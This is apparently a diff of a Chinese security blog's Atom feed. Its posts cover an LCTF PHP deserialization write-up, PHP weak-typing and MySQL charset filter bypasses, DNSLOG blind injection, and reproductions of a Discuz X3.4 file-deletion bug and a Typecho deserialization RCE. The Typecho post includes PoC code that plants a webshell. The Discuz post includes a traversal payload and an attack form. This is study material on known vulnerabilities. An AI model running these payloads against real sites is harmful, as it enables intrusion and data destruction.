+    <content type="html"><![CDATA[<p>这次的LCTF比赛下来，依旧感受到了web深深的套路，本想至少做个签到，果然还是自己太菜了(手动笑哭)</p><h1 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h1><p>点开链接进入会进入源码页面，源码如下:</p><pre><code>&lt;?phphighlight_file(__FILE__);$b = &apos;implode&apos;;call_user_func($_GET[f],$_POST);session_start();if(isset($_GET[name])){    $_SESSION[name] = $_GET[name];}var_dump($_SESSION);$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);call_user_func($b,$a);?&gt;</code></pre><h1 id="第一次想法"><a href="#第一次想法" class="headerlink" title="第一次想法"></a>第一次想法</h1><p>刚开始以为需要使用第二个的<code>call_user_func</code>函数来创建webshell，这就需要覆盖原本的$b的值。因此想到利用前面一个<code>call_user_func</code>函数。<br>在php中，常见的能实现变量覆盖的函数有<code>extract，POST()</code>、<code>arse_str()</code>、<code>mb_parse_str()</code><br>因此使得$_GET[f]=extract，POST传入b=assert，即可使得$b的值被覆盖为eval<br>最后传入name=phpinfo(),应该就可以出现phpinfo界面了。<br>但是。。。。。。<br>本地调试失败了😭<br>后面才看到$a是一个数组。因为call_user_func_array函数与call_user_func不同的是，call_user_func_array是利用回调函数处理数组，而call_user_func_array则是利用回调函数处理字符串。这里如果是call_user_func_array函数，我的精(弱)彩(智)推(想)理(法)就成功了，果然高手云集的比赛，连签到都不一样。</p><h1 id="第二次想法"><a href="#第二次想法" class="headerlink" title="第二次想法"></a>第二次想法</h1><p>接着又仔细看了代码，看到session_start()，想到了之前比赛碰到过的，利用PHP session 反序列化机制。将用来序列化/反序列化的处理器设置为php_serialize。因为使用php_serialize处理器进行session解析的时候，会以|作为作为key和value的分隔符，对value进行反序列化，因此我们可以将value改为序列化payload，进而继续利用。但是代码中并没有出现具体的对象什么的，我的扫描器扫目录的时候也没有扫出文件😂(后面才知道又flag.php)当时还以为有bug，所以就先放着了。</p><h1 id="正解思路"><a href="#正解思路" class="headerlink" title="正解思路"></a>正解思路</h1><p>发现flag.php文件，其中提示我们要本地访问才能将flag放入到session中，联想到要前面有var_dump($_SESSION)的操作，应该是反序列化-&gt;ssrf的操作。<br>但是缺少序列化的对象，后面才发现需要使用php的原生类Soap。通过反序列化精心构造的Soap类，能实现对指定地址的访问，符合ssrf的操作。<br>所以正确顺序应该是第一次GET输入f=session_start&amp;name=|序列化后的soap类，POST输入serialize_handler=php_serialize，,使得serialize_handler被设置为php_serialize，并且将序列化后的soap类值存储到session中。<br>第二次访问页面，GET输入f=extract,POSTh输入b=call_user_func，这一步使得$b被覆盖为call_user_func,通过回调函数使Soap类去调用welcome_to_the_lctf2018方法，因为这个方法不存在，sj就会自动调用__call魔术函数，从而触发ssrf,将flag写入session中。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://xz.aliyun.com/t/3340#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/3340#toc-3</a><br><a href="https://xz.aliyun.com/t/3341#toc-22" target="_blank" rel="noopener">https://xz.aliyun.com/t/3341#toc-22</a><br><a href="https://xz.aliyun.com/t/3336" target="_blank" rel="noopener">https://xz.aliyun.com/t/3336</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;这次的LCTF比赛下来，依旧感受到了web深深的套路，本想至少做个签到，果然还是自己太菜了(手动笑哭)&lt;/p&gt;
+&lt;h1 id=&quot;bestphp’s-revenge&quot;&gt;&lt;a href=&quot;#bestphp’s-revenge&quot; class=&quot;headerlink&quot; title=
+      
+    
+    </summary>
+    
+      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
+    
+    
+      <category term="-反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Mysql字符集</title>
+    <link href="http://yoursite.com/2018/02/14/Mysql%E5%AD%97%E7%AC%A6%E9%9B%86/"/>
+    <id>http://yoursite.com/2018/02/14/Mysql字符集/</id>
+    <published>2018-02-14T10:45:29.000Z</published>
+    <updated>2018-02-14T12:07:30.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>#1.格式特性#</p><pre><code>MYSQL 中 utf8_unicode_ci 和 utf8_general_ci 两种编码格式,utf8_general_ci不区分大小写, Ä = A, Ö = O, Ü = U 这三种条件都成立, 对于utf8_general_ci下面的等式成立：ß = s ，但是，对于utf8_unicode_ci下面等式才成立：ß = ss 。可以看到大写O和Ö是相等的</code></pre><p>某些情况下可以绕过<code>stripos()</code><br>其中<code>stripos()</code>函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）<br>例如:</p><pre><code>stripos($_GET[&apos;usern3me&apos;],&apos;Bctf2O16&apos;)</code></pre><p>我们可以输入类似BÇtf2O16来进行绕过</p><p>#2.转换特性#</p><p>##复现##<br>先看看下面的代码</p><pre><code>&lt;?php $con = mysql_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;&apos;);mysql_query(&quot;set names utf8&quot;);mysql_select_db(&quot;test&quot;);if($_GET[&apos;name&apos;]===&apos;admin&apos;){        $name = &apos;NO&apos;;    }else{        $name = addslashes($_GET[&apos;name&apos;]);    }$sql = &quot;SELECT * FROM `table1` WHERE username=&apos;{$name}&apos;&quot;;$result = mysql_query($sql);$num = mysql_num_rows($result);if($num&gt;0){    echo &quot;success&quot;;}?&gt;</code></pre><p>数据库中我只存放了admin一条数据，所以我们需要输入不为<code>admin</code>的值，去获取admin的数据<br>这里看了Ｐ牛的文章之后,知道了可以使用<code>Â</code>等latin1字符来绕过php的判断.<br>我们传入<code>username=admin%c2</code>,在mysql中可以正常查出<code>username=&#39;admin&#39;</code>的结果<br>![mysql][1]<br>[1]:/imagess/mysql_1.png</p><p>##原理##<br>原因在于Mysql字段的字符集和php mysqli客户端设置的字符集不相同<br>代码中<code>set names utf8</code>的意思是将客户端的字符集设置为utf8<br>执行了<code>set names utf8;</code>以后，<code>character_set_client</code>、<code>character_set_connection</code>、<code>character_set_results</code>等与客户端相关的配置字符集都变成了utf8<br>如果客户端、服务端的字符集出现了差别，Mysql在执行查询的时候，就会进行字符集的转换<br>而<code>Mysql在转换字符集的时候，会将不完整的字符给忽略了</code><br>例如<code>佬</code>这个汉字的UTF-8编码是<code>\xE4\xBD\xAC</code><br>我们依次使用<code>\xE4</code>,<code>\xE4\xBD</code>,<code>\xE4\xBD\xAC</code>作为参数传入<br>能够发现前两个都可以成功，但是第三个(佬的完整编码)会引发一个错误<br>这是因为在utf8转换为latin1时,latin1并不支持汉字,而之前并没有报错是因为编码不完整,Mysql进行转换时自动将其忽略</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;#1.格式特性#&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;MYSQL 中 utf8_unicode_ci 和 utf8_general_ci 两种编码格式,
+utf8_general_ci不区分大小写, Ä = A, Ö = O, Ü = U 这三种条件都成立, 
+对于utf8_ge
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>盲注-DNSLOG</title>
+    <link href="http://yoursite.com/2018/02/12/%E7%9B%B2%E6%B3%A8-DNSLOG/"/>
+    <id>http://yoursite.com/2018/02/12/盲注-DNSLOG/</id>
+    <published>2018-02-12T14:52:22.000Z</published>
+    <updated>2018-02-12T15:18:38.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>#适用情况#</p><ul><li>目标存在sql盲注，但使用sqlmap可能会导致ip被禁止</li><li>目标存在命令注入，但没有回显，无法证实漏洞</li></ul><p>#原理#<br>dns在解析的时候会留下日志，我们就是通过解析日志，来获取信息<br>比如，我们拥有一个域名xxxx.com,如果我们访问yyyyy.xxxx.com,通过这个域名解析请求，那么我们就能接收到yyyyy这个信息</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;#适用情况#&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;目标存在sql盲注，但使用sqlmap可能会导致ip被禁止&lt;/li&gt;
+&lt;li&gt;目标存在命令注入，但没有回显，无法证实漏洞&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;#原理#&lt;br&gt;dns在解析的时候会留下日志，我们就是通过解析日志，来获取信息&lt;br
+      
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="-注入" scheme="http://yoursite.com/tags/%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>php代码安全</title>
+    <link href="http://yoursite.com/2018/02/05/php%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8/"/>
+    <id>http://yoursite.com/2018/02/05/php代码安全/</id>
+    <published>2018-02-05T04:47:46.000Z</published>
+    <updated>2018-02-05T06:52:18.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>PHP中的<code>is_numeric</code>函数,用来判断变量是否为数字</p><h2 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h2><p>PHP弱类型语言的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval数字化再比</p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><pre><code>&lt;?php    $id = $_GET[&apos;id&apos;];    is_numeric($id)?die(&quot;Sorry....&quot;):NULL;        if($id&gt;333){        echo &quot;success&quot;;    } ?&gt;</code></pre><p>这里程序要我们输入一个比333大的数字，但是又限制我们不能输入数字，因此我们可以利用php的特性,输入<code>?id=334a</code>即可绕过<br>图片1</p><h1 id="比较符缺陷"><a href="#比较符缺陷" class="headerlink" title="比较符缺陷"></a>比较符缺陷</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>php中有两种运算比较符，一种使严格比较，另一种使松散比较<br>严格比较符，会先判断两种字符串的类型是否相等，再比较</p><pre><code>===   //全等!==   //不全等</code></pre><p>松散比较符，会先将字符串类型转换成相同，再比较</p><pre><code>==   //等于!=   //不等</code></pre><p>直接上例子</p><pre><code>var_dump(0==&quot;aa&quot;);var_dump(0===&quot;aa&quot;);var_dump(1==&quot;1aa&quot;);var_dump(&quot;0e123&quot; == &quot;0e456&quot;);var_dump(&quot;0e123&quot; == &quot;0eabc&quot;);</code></pre><p>这里0和aa进行松散比较,gg会被转换为数字0,所以会输出true<br>0和aa进行严格比较，因为aa是字符串,与整数0类型不同,所以为false<br>1和1aa进行松散比较,1gg被强制转换为int类型的时候会从字符串的第一位开始做判断进行转换，所以1gg会被转换为1，所以为true<br>0e123与0e456相互不严格性质比较的时候，会将0e这类字符串识为科学技术法的数字,0的无论多少次方都是零，所以相等,输出 true<br>0e123与0eabc相互进行不严格性质比较的时候，本应该将0e这类字符串识为科学技术法的数字,但是这里的0e后面跟着的是abc,数学中科学计数的指数不可以包含字母。所以这里字符串中虽然是0e开头，但是后面的abc却不符合科学技法的规范，所以输出是 false</p><h2 id="实践-1"><a href="#实践-1" class="headerlink" title="实践"></a>实践</h2><pre><code>&lt;?php    $md51 = md5(&apos;QNKCDZO&apos;);    $a = @$_GET[&apos;a&apos;];    $md52 = @md5($a);    if(isset($a)){        if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) {            echo &quot;success&quot;;        } else {            echo &quot;false!!!&quot;;        }    }    else{        echo &quot;please input a&quot;;    }?&gt;</code></pre><p>根据程序，我们需要输入一个a的参数，使得a不等于<code>QNKCDZO</code>并且a得md5值必须等于<code>QNKCDZO</code>加密后的md5值<br>但是因为<code>QNKCDZO</code>加密后的md5值为<code>0e830400451993494058024219903391</code>,为0e开头,所以我们找一个MD5之后为0e开头的变量即可</p><h1 id="sha1-、md5-加密函数漏洞缺陷"><a href="#sha1-、md5-加密函数漏洞缺陷" class="headerlink" title="sha1()、md5()加密函数漏洞缺陷"></a>sha1()、md5()加密函数漏洞缺陷</h1><h2 id="缺陷-1"><a href="#缺陷-1" class="headerlink" title="缺陷"></a>缺陷</h2><p><code>md5()</code>和<code>sha1()</code>对一个数组进行加密将返回 NULL</p><h2 id="实践-2"><a href="#实践-2" class="headerlink" title="实践"></a>实践</h2><pre><code>if ($_GET[&apos;name&apos;] != $_GET[&apos;password&apos;])  if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;]))    print(&quot;success&quot;);</code></pre><p>这里利用<code>sha1()</code>函数在处理数组的时候由于无法处理将返回NULL<br>我们只需输入<code>?name[]=a&amp;password[]=b</code>即可<br>同理md5也是用同样的办法</p><h1 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h1><h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><p><code>strcmp()</code>函数:比较两个字符串（区分大小写)</p><h2 id="缺陷-2"><a href="#缺陷-2" class="headerlink" title="缺陷"></a>缺陷</h2><p>在<code>5.3</code>版本之前的php中,<code>strcmp</code>函数接受到不符合的类型，例如数组类型,函数将发生错误，并且返回0</p><h2 id="实践-3"><a href="#实践-3" class="headerlink" title="实践"></a>实践</h2><pre><code>if (strcmp($_GET[&apos;password&apos;], $flag) == 0)    echo &quot;success&quot;;</code></pre><p>这里<code>$flag</code>为我们不知道的数据<br>我们利用<code>strcmp</code>的缺陷,只需传入一个数组,即可绕过<br>除了<code>strcmp()</code>函数外，<code>ereg()</code>和<code>strpos()</code>函数在处理数组的时候也会异常，返回<code>NULL</code></p><h1 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h1><h2 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h2><p>parse_str函数的作用就是解析字符串并注册成变量，在注册变量之前不会验证当前变量是否存在，所以直接覆盖掉已有变量</p><h2 id="实践-4"><a href="#实践-4" class="headerlink" title="实践"></a>实践</h2><pre><code>&lt;?php    $a = &quot;hhh&quot;;    $b = $_GET[&apos;b&apos;];    @parse_str($b);    if ($a[0] != &apos;hhh&apos;) {        echo &quot;sucess&quot;;    }else{        exit(&apos;your answer is wrong~&apos;);    }?&gt;</code></pre><p>这段代码中$a的值固定了，但是可以利用变量覆盖函数的缺陷这里可以对a的变量进行重新赋值，藉此绕过:</p><pre><code>?b=a[0]=hack</code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="http://www.freebuf.com/articles/rookie/161474.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/rookie/161474.html</a><br><a href="https://paper.seebug.org/401/" target="_blank" rel="noopener">https://paper.seebug.org/401/</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;is-numeric&quot;&gt;&lt;a href=&quot;#is-numeric&quot; class=&quot;headerlink&quot; title=&quot;is_numeric&quot;&gt;&lt;/a&gt;is_numeric&lt;/h1&gt;&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerli
+      
+    
+    </summary>
+    
+      <category term="php" scheme="http://yoursite.com/categories/php/"/>
+    
+    
+      <category term="-php" scheme="http://yoursite.com/tags/php/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Discuz X3.4 任意文件删除复现</title>
+    <link href="http://yoursite.com/2018/02/03/Discuz-X3-4-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://yoursite.com/2018/02/03/Discuz-X3-4-任意文件删除复现/</id>
+    <published>2018-02-03T13:40:44.000Z</published>
+    <updated>2018-02-03T14:32:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="简略分析"><a href="#简略分析" class="headerlink" title="简略分析"></a>简略分析</h1><p>漏洞存在于upload/source/include/spacecp/spacecp_profile.php这个文件中.<br>最关键的漏洞代码位于该文件的第229行:</p><pre><code>@unlink(getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$space[$key]);</code></pre><p>往上看之前的代码,可以发现，只要我们能成功上传文件,就能够调用unlink删除指定文件<br>而删除文件，我们需要控制$space[$key]这个值<br>继续寻找相关的代码</p><pre><code>$space = getuserbyuid($_G[&apos;uid&apos;]);space_merge($space, &apos;field_home&apos;);space_merge($space, &apos;profile&apos;);</code></pre><p>可以从函数名等看出,<code>$space</code>存储的使用户的相关信息，所以我们这里比如可以修改birthprovince为指定文件,就可以了.    </p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>先在网站根目录下创建一个hack.txt<br>安装好漏洞网站之后，创建一个普通用户，进入设置-&gt;个人资料,在源代码中找到formhash的值</p><p>接着post恶意数据</p><pre><code>birthprovince=../../../hack.txt&amp;profilesubmit=1&amp;formhash=找到的formhash值</code></pre><p>执行后发现出生地的值被修改为了<code>hack.txt</code><br>构造表单,上传任意文件，即可删除指定文件</p><pre><code>&lt;form action=&quot;http://localhost/discuz/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;file&quot; name=&quot;birthprovince&quot; id=&quot;file&quot; /&gt;&lt;input type=&quot;text&quot; name=&quot;formhash&quot; value=&quot;(这里为自己的fromhash值)&quot; /&gt;&lt;/p&gt;&lt;input type=&quot;text&quot; name=&quot;profilesubmit&quot; value=&quot;1&quot;/&gt;&lt;/p&gt;&lt;input type=&quot;submit&quot;&quot; value=&quot;Submit&quot; /&gt;&lt;/p&gt;&lt;/from&gt;</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;简略分析&quot;&gt;&lt;a href=&quot;#简略分析&quot; class=&quot;headerlink&quot; title=&quot;简略分析&quot;&gt;&lt;/a&gt;简略分析&lt;/h1&gt;&lt;p&gt;漏洞存在于upload/source/include/spacecp/spacecp_profile.php这个文件中.&lt;b
+      
+    
+    </summary>
+    
+      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+      <category term="-漏洞复现 -Discuz" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Discuz/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Typecho反序列化漏洞复现</title>
+    <link href="http://yoursite.com/2018/02/01/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://yoursite.com/2018/02/01/Typecho反序列化漏洞复现/</id>
+    <published>2018-02-01T14:17:37.000Z</published>
+    <updated>2018-02-02T07:40:34.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞的开始出现在install.php中,位于install.php中54-67行</p><pre><code>ob_start();session_start();//判断是否已经安装if (!isset($_GET[&apos;finish&apos;]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . &apos;/config.inc.php&apos;) &amp;&amp; empty($_SESSION[&apos;typecho&apos;])) {    exit;}// 挡掉可能的跨站请求if (!empty($_GET) || !empty($_POST)) {    if (empty($_SERVER[&apos;HTTP_REFERER&apos;])) {        exit;    }</code></pre><p>可以看到进入install.php，需要进行相应的判断<br>需要满足<code>$_GET[&#39;finish&#39;]</code>必须有值,而且<code>referer</code>必须是本站<br>接着继续往下,在install.php 232行到237行</p><pre><code>&lt;?php$config = unserialize(base64_decode(Typecho_Cookie::get(&apos;__typecho_config&apos;)));Typecho_Cookie::delete(&apos;__typecho_config&apos;);$db = new Typecho_Db($config[&apos;adapter&apos;], $config[&apos;prefix&apos;]);$db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);Typecho_Db::set($db);?&gt;</code></pre><p>我们可以看到这里执行了反序列化操作，并且<code>__typecho_config</code>的值我们是可以控制的。<br>问题是如何去利用，如何去通过魔术方法配合，最常用的有以下一些:<br><code>__destruct()</code><br><code>__wakeup()</code><br><code>__toString()</code><br>其中<code>__destruct()</code>是在对象被销毁的时候自动调用,<code>__wakeup()</code>在反序列化的时候自动调用,<code>__toString()</code>是在调用对象的时候自动调用<br>所以我们如果反序列化的是一个数组,adapter设置为某个类，就会自动调用该类的<strong>tostring方法。<br>所以接下来我们就寻找所有的</strong>tostring方法,其中可利用的位于/var/Typecho/Feed.php文件290行<br>    $content .= ‘<a href="dc:creator" target="_blank" rel="noopener">dc:creator</a>‘ . htmlspecialchars($item[‘author’]-&gt;screenName) . ‘&lt;/dc:creator&gt;’ . self::EOL;<br><code>__get()</code>方法用于访问不存在的成员变量时调用,<code>__set()</code>方法用于设置不存在的成员变量时调用。而<code>$item[&#39;author&#39;]-&gt;screenName</code>中，<code>$item</code>是由<code>$this-&gt;_items</code>的foreach循环出来的，并且<code>$this-&gt;_items</code>是<code>Typecho_Feed</code>类的一个<code>private</code>属性<br>所以就满足了<code>__get</code>方法的前提。因此如果我们可以给<code>item[&#39;author&#39;]</code>设置中没有<code>screenName</code>,就会执行该类的<code>__get()</code>方法。<br>于是我们继续找<code>__get()</code>方法,发现/var/Typecho/Request.php中的<code>__get()</code>方法如下:</p><pre><code>public function __get($key){    return $this-&gt;get($key);}</code></pre><p>接着跟进,发现<code>$this-&gt;get()</code>结尾代码如下:</p><pre><code>return $this-&gt;_applyFilter($value);</code></pre><p>继续跟进</p><pre><code>private function _applyFilter($value){     if ($this-&gt;_filter) {        foreach ($this-&gt;_filter as $filter) {            $value = is_array($value) ? array_map($filter, $value) :            call_user_func($filter, $value);        }        $this-&gt;_filter = array();    }    return $value;}</code></pre><p>而其中<code>$filter</code>和<code>$value</code>我们几乎都是可以间接控制的，所以就可以利用<code>call_user_func</code>或者<code>array_map</code>来执行代码.<br>比如我们设置$filter为数组，第一个数组键值是assert，$value设置php代码，即可执行。<br>我们来回溯以下整个利用链:</p><ol><li>满足<code>$_GET[&#39;finish&#39;]</code>有值,<code>referer</code>必须是本站,使得我们能进入install.php</li><li>给<code>__typecho_config</code>赋予包含数组的序列化值,并且设置<code>adapter</code>为<code>Typecho_Feed</code>类,这样反序列化时，会调用<code>Typecho_Feed</code>类的<code>__toString()</code>方法</li><li>设置<code>item[&#39;author&#39;]</code>的值为<code>Typecho_Feed</code>类,并且该类不包含<code>screenName</code>值,从而调用<code>Typecho_Feed</code>类的<code>__get()</code>方法</li><li><code>__get()</code>方法调用<code>get()</code>方法,并且传入的参数为<code>screenName</code></li><li>接着<code>get()</code>调用<code>_applyFilter()</code>,传入的<code>$value</code>是<code>$this-&gt;_params[$key]</code>的值，<code>$key</code>就是screenName</li><li>在<code>_applyFilter()</code>中,<code>$this-&gt;_filter</code>的值会传给<code>$filter</code>,而<code>array_map()</code>和<code>call_user_func()</code>中的<code>$filter</code>、<code>$value</code>参数我们都可以控制</li></ol><p>如果构造像<code>phpinfo()</code>这种有回显的poc，我们会发现页面会返回500，但是像<code>assert(&#39;file_put_contents(\&#39;hack.php\&#39;, \&#39;&lt;?php @eval($_POST[hack]);?&gt;\&#39;)&#39;)这种，虽然返回500，但是命令却是已经比执行了至于原因，是因为install.php中刚开始就调用了</code>ob_start()<code>,我们注入对象的代码会触发</code>ob_end_clean()`执行，导致原本的输出会在缓冲区被清理.<br>不过我们可以在我们的命令执行之后，造成报错，语句会停止，这样缓冲区的数据就会被输出</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>1.显示phpinfo</p><pre><code>&lt;?phpclass Typecho_Request{    private $_params = array();    private $_filter = array();    public function __construct()    {        $this-&gt;_params[&apos;screenName&apos;] =&quot;phpinfo()&quot;;        $this-&gt;_filter[0] = &apos;assert&apos;;    }}class Typecho_Feed{    private $_type = &apos;ATOM 1.0&apos;;    private $_items = array();    public $dateFormat;     public function __construct()    {        $item[&apos;link&apos;] = &apos;1&apos;;        $item[&apos;title&apos;] = &apos;2&apos;;        $item[&apos;date&apos;] = 1507720298;        $item[&apos;author&apos;] = new Typecho_Request();        $item[&apos;category&apos;] = array(new Typecho_Request());   #这里会造成报错,使命令回显        $this-&gt;_items[0] = $item;    }}$x = new Typecho_Feed();$a = array(    &apos;adapter&apos; =&gt; $x,    &apos;prefix&apos; =&gt; &apos;typecho_&apos;);echo base64_encode(serialize($a));?&gt;</code></pre><p><img src="/imagess/typecho_1.PNG" alt="1"><br>2.没有回显，写入文件</p><pre><code>&lt;?phpclass Typecho_Request{    private $_params = array();    private $_filter = array();    public function __construct()    {        $this-&gt;_params[&apos;screenName&apos;] =&quot;file_put_contents(\&apos;hack.php\&apos;, \&apos;&lt;?php @eval($_POST[hack]);?&gt;\&apos;)&quot;;        $this-&gt;_filter[0] = &apos;assert&apos;;    }}class Typecho_Feed{    private $_type = &apos;ATOM 1.0&apos;;    private $_items = array();    public $dateFormat;    public function __construct()    {        $item[&apos;link&apos;] = &apos;1&apos;;        $item[&apos;title&apos;] = &apos;2&apos;;        $item[&apos;date&apos;] = 1507720298;        $item[&apos;author&apos;] = new Typecho_Request();        #$item[&apos;category&apos;] = array(new Typecho_Request());        $this-&gt;_items[0] = $item;    }}$x = new Typecho_Feed();$a = array(    &apos;adapter&apos; =&gt; $x,    &apos;prefix&apos; =&gt; &apos;typecho_&apos;);echo base64_encode(serialize($a));?&gt;</code></pre><p>参考链接:<br><a href="https://paper.seebug.org/424" target="_blank" rel="noopener">https://paper.seebug.org/424</a><br><a href="http://p0sec.net/index.php/archives/114" target="_blank" rel="noopener">http://p0sec.net/index.php/archives/114</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;漏洞分析&quot;&gt;&lt;/a&gt;漏洞分析&lt;/h1&gt;&lt;p&gt;漏洞的开始出现在install.php中,位于install.php中54-67行&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ob_st
+      
+    
+    </summary>
+    
+      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+      <category term="-漏洞复现 -反序列化" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>信息收集小结</title>
+    <link href="http://yoursite.com/2018/02/01/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B0%8F%E7%BB%93/"/>
+    <id>http://yoursite.com/2018/02/01/信息收集小结/</id>
+    <published>2018-02-01T05:16:43.000Z</published>
+    <updated>2018-02-01T07:21:16.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="搜索引擎搜集信息"><a href="#搜索引擎搜集信息" class="headerlink" title="搜索引擎搜集信息"></a>搜索引擎搜集信息</h1><p>我们可以使用搜索引擎自带的常用的一些高级搜索指令来帮助我们快速搜索到相关信息</p><ol><li><p>site命令<br>用于把搜索范围限定在特定站点中。<br>site命令语法格式有两种：<br>1.site:网址 关键词<br>2.关键词 site:网址<br><img src="/imagess/xinxi_1.PNG" alt="1"></p></li><li><p>inurl命令<br>用于搜索查询词出现在URL中的页面<br>例如百度搜索<code>inurl:test</code>,则返回页面中的url都包含test<br><img src="/imagess/xinxi_2.PNG" alt="2"></p></li><li><p>index命令<br>用于搜索相关的资源<br>这里直接上图<br><img src="/imagess/xinxi_3.PNG" alt="3"></p></li><li><p>intitle命令<br>返回页面中title包含关键词的页面<br><img src="/imagess/xinxi_4.PNG" alt="4"></p></li></ol><p>谷歌搜索需要vpn等，所以这里可以找一些谷歌镜像网站<br><a href="http://ac.scmor.com" target="_blank" rel="noopener">http://ac.scmor.com</a><br><a href="https://coderschool.cn/1853.html" target="_blank" rel="noopener">https://coderschool.cn/1853.html</a><br><a href="https://www.zizaifan.com/html/google.html" target="_blank" rel="noopener">https://www.zizaifan.com/html/google.html</a></p><h1 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h1><p>我们经常需要收集一些二、三级域名，可以使用下面的一些工具<br>Sublist3r<br><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a><br>subDomainsBrute<br><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a><br>GSDF<br><a href="https://github.com/We5ter/GSDF" target="_blank" rel="noopener">https://github.com/We5ter/GSDF</a></p><p>还有一些字典:<br><a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">https://github.com/rootphantomer/Blasting_dictionary</a><br><a href="https://github.com/Strikersb/fuzz_dict" target="_blank" rel="noopener">https://github.com/Strikersb/fuzz_dict</a></p><p>参考链接:<a href="https://www.anquanke.com/post/id/96602" target="_blank" rel="noopener">https://www.anquanke.com/post/id/96602</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
